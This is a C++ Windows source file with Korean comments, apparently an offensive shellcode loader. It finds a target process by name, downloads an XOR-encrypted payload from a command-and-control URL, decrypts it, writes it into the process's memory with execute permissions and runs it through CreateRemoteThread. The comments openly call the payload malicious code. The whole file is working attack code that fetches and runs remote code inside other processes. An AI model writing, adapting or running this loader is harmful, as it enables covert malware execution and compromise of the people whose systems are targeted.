#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <cstring>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
using namespace std;

// 실행중인 프로세스 정보를 가져오기 위한 스냅샷 함수
DWORD getProcId(const wchar_t* processName) {
    // 메모리에 로드된 프로세스 스냅샷 생성
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wcout << L"Failed to take a snapshot" << endl;
        return 0;
    }

    // 스냅샷을 순회하며 저장할 프로세스 변수 생성
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            // 대소문자 구분 없이 비교하여 일치할 경우 조건분기
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                wcout << L"Succeed to find a process : " << pe.szExeFile << endl;
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    wcout << L"Failed to find a process in memory" << endl;
    return 0;
}

// 프로세스 ID를 가져오기 위한 함수
HANDLE openProcessByPid(DWORD processId) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProc) {
        wcout << L"Failed to get Process handle" << endl;
    }
    return hProc;
}

// 실행중인 프로세스에서 메모리 공간 확보
LPVOID allocRemoteMemory(HANDLE hProc, SIZE_T dataSize) {
    LPVOID exec = VirtualAllocEx(
        hProc, NULL, dataSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!exec) {
        wcout << L"Failed to get Memory buffer" << endl;
    }
    return exec;
}

// 악성코드를 다운로드 하기 위한 함수
unsigned char* downloadBinary(const wchar_t* serverAddr, DWORD* outSize) {
    // nullptr 예외처리
    if (!outSize) {
        wcout << L"outSize is null" << endl;
        return nullptr;
    }
    *outSize = 0;

    // 브라우저 핸들 생성
    HINTERNET hInternet = InternetOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0
    );
    // 브라우저 핸들 생성 실패 예외처리
    if (!hInternet) {
        wcout << L"Failed to get Internet handle" << endl;
        return nullptr;
    }

    // 브라우저 url 접속 핸들 생성
    HINTERNET hUrl = InternetOpenUrl(
        hInternet, serverAddr, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0
    );
    // 브라우저 url 접속 핸들 생성 실패 예외처리
    if (!hUrl) {
        wcout << L"Failed to get InternetOpenUrl handle" << endl;
        InternetCloseHandle(hInternet);
        return nullptr;
    }

    // 다운로드 받을 버퍼, 읽은 바이트 변수 지정
    DWORD bytesRead = 0;
    BYTE buffer[4096];
    string fullData;
    // 읽을 수 있는 바이트가 0일 때까지 읽어서 fullData에 저장
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        fullData.append((char*)buffer, bytesRead);
    }

    // 브라우저 핸들 종료
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    // 읽은 데이터가 빈값일 경우 예외 처리
    if (fullData.empty()) {
        return nullptr;
    }

    // 형변환을 위해 변수 이동
    unsigned char* result = new unsigned char[fullData.size()];
    memcpy(result, fullData.data(), fullData.size());
    *outSize = fullData.size();
    return result;
}

// 대상 프로세스 메모리 공간에 악성코드 삽입
BOOL writeRemoteMemory(HANDLE hProc, LPVOID dest, void* data, SIZE_T size) {
    // 쓴 데이터 크기 초기화
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, dest, data, size, &written)) {
        wcout << L"Failed to write memory" << endl;
        return FALSE;
    }
    wcout << L"Written " << written << L" bytes" << endl;
    return TRUE;
}

// 대상 프로세스 메모리에 로드된 악성코드 실행 함수
BOOL createRemoteThread(HANDLE hProc, LPVOID startAddr, LPVOID param) {
    DWORD threadId = 0;

    // 원격 스레드 생성
    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)startAddr, param,
        0, &threadId
    );

    if (hThread == NULL) {
        wcout << L"Failed to create remote thread: " << GetLastError() << endl;
        return FALSE;
    }

    // 쓰레드 실행 완료 대기
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return TRUE;
}

// 암호화된 쉘코드 복호화 함수
void payloadDecrypt(uint8_t* data, size_t data_len, const char* key) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 4) {
        cout << "<process name> <c2 address> <xor key>" << endl;
        return 0;
    }

    // 인자로 받은 프로세스를 대상 시스템에서 탐색
    DWORD targetPid = getProcId(argv[1]);
    if (!targetPid) return 0;

    // 타겟 프로세스의 pid를 통해 프로세스 핸들 획득
    HANDLE hProc = openProcessByPid(targetPid);
    if (!hProc) return 0;

    // 페이로드 다운로드
    DWORD outSize = 0;
    unsigned char* payload = downloadBinary(argv[2], &outSize);
    if (payload == nullptr) return 0;

    // 암호화된 쉘코드 복호화
    char xorKey[256];
    wcstombs(xorKey, argv[3], sizeof(xorKey));
    payloadDecrypt(payload, outSize, xorKey);

    // 타겟 프로세스의 메모리 공간 확보
    SIZE_T dataSize = outSize;
    LPVOID pVirtualMemory = allocRemoteMemory(hProc, dataSize);
    if (!pVirtualMemory) return 0;

    // 메모리 공간에 페이로드 삽입
    if (!writeRemoteMemory(hProc, pVirtualMemory, payload, dataSize)) return 0;

    // 악성코드를 실행할 원격 쓰레드 생성
    createRemoteThread(hProc, pVirtualMemory, NULL);
    return 0;
}
